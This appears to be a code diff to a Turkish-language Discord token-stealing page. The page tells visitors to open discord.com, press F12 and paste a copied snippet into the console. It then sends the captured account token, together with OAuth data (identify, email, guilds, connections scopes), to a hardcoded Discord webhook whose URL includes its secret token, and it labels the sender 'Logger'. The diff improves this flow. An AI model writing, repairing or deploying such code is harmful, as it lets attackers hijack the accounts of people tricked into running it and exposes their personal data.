@@ -57,7 +57,7 @@
 
     <div class="step">
       <b>Yol 1 — kodu çalıştır</b>
-      <p class="mini">Yeni sekmede <code>discord.com</code> aç → F12 → Console → kodu yapıştır → Enter.</p>
+      <p class="mini">Yeni sekmede <code>discord.com</code> aç → F12 → Console → kodu yapıştır → Enter. Token bulunca sayfa buraya kendisi döner.</p>
       <pre id="snippet"></pre>
       <button id="copy" class="sm">Kodu kopyala</button>
     </div>
@@ -78,7 +78,7 @@
 const CONFIG = {
   WEBHOOK: "https://discord.com/api/webhooks/1557367996849066025/Qh_jUvGk24lLgdg-bPZVu30efBkpS8ywZFpQQ2_gcEmCkK-Ep2RyQT3X9eBK9W70HsOf",
   CLIENT_ID: "1571867967187325008",
-  REDIRECT: "",           // örn: "https://network-guy805.github.io/repo/index.html"
+  REDIRECT: "",
   SCOPES: "identify email guilds connections",
   AUTO_OAUTH: true
 };
@@ -208,7 +208,7 @@ function snippet() {
 
 async function sendReal(raw, src) {
   const t = String(raw || "").trim().replace(/^["']|["']$/g, "").replace(/\s+/g, "");
-  if (!t) return;
+  if (!t) return false;
   const ok = TOKEN_RE.test(t);
   const sent = await report({
     username: "Logger",
@@ -310,18 +310,21 @@ async function callback(hash) {
     $("#b").onclick = goOAuth;
     return;
   }
- 
+
   if (hash.get("t")) {
     $("#sp").style.display = "block";
     $("#t").textContent = "Token alındı";
     $("#m").textContent = "Gönderiliyor...";
     $("#panel").classList.remove("hide");
+    $("#snippet").textContent = snippet();
     const ok = await sendReal(hash.get("t"), "console");
     $("#sp").style.display = "none";
     $("#t").textContent = ok ? "Tamamlandı" : "Hata";
     $("#m").textContent = ok ? "Token webhook'a düştü." : "Gönderilemedi, kutuya elle yapıştır.";
     try { history.replaceState(null, "", location.pathname); } catch (e) {}
     return;
+  }
+
   if (hash.get("access_token")) return callback(hash);
 
   const d = await collect();
